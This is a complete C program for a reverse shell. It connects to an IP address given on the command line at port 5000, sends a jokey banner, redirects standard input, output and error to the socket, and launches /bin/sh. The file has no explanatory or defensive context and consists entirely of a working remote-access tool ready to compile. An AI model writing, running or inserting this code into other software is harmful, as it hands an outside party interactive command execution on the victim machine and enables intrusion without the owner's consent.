#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>


#define HEADER "Holy craps, shells!\n\n"
#define SHELL "/bin/sh"

int main(int argc, char *argv[]) {
    int sockfd = 0;
    char recvBuff[1024];
    struct sockaddr_in serv_addr;

    if (argc != 2) {
        printf("\nUsage: %s <ip of server>\n", argv[0]);
        return 1;
    }

    memset(recvBuff, '0', sizeof(recvBuff));
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        return 1;
    }

    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(5000);

    if (inet_pton(AF_INET, argv[1], &serv_addr.sin_addr) <= 0) {
        return 1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("COULDN'T MAKE A DAMN CONNECTION!\n");
        return 1;
    }

    send(sockfd, HEADER, strlen(HEADER), 0);

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // Here's where the magic happens
    execl(SHELL, SHELL, (char *)0);

    close(sockfd);
    return 0;
}
